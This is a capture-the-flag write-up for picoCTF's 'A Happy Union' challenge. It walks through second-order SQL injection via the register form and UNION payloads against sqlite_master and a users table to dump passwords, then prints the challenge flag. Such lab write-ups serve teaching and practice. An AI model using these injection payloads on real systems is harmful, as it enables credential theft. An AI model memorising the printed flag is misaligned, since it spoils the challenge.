## A Happy Union - 110

### Description

I really need access to [website](http://shell2017.picoctf.com:41558), but I forgot my password and there is no reset. Can you help? I like lite sql :)

### Hint

  - A SQL union allows a single query to select values from multiples tables.

### Write up

There are Login and Register button.

Trying to login with somthing like below doesn't work.

    admin'
    ' or 1=1
    ' or '1'='1

Let's use register to attack.

    username='
    password=asdf
    password=asdf

When I registered with this account, and tried to login. This error message is shown.

    There Was An Error With Your Request

    select id, user, post from posts where user = ''';

Oh, we found the SQL query.

What we want is the password for some user, but I don't think `posts` table does hold that. So, let's find other table names.

In sqlite, there is a `sqlite_master` table that hold metadata for other tables.

> ' union select 1, 1, name from sqlite_master; --

By using this payload, we can find that there is `users` table.

> ' union select user, pass, 1 from users; --

Then, we can find passwords from users table.

> flag{union?_why_not_onion_b6e6a3cd8e3f1fe5f6109d1618bddbd1}
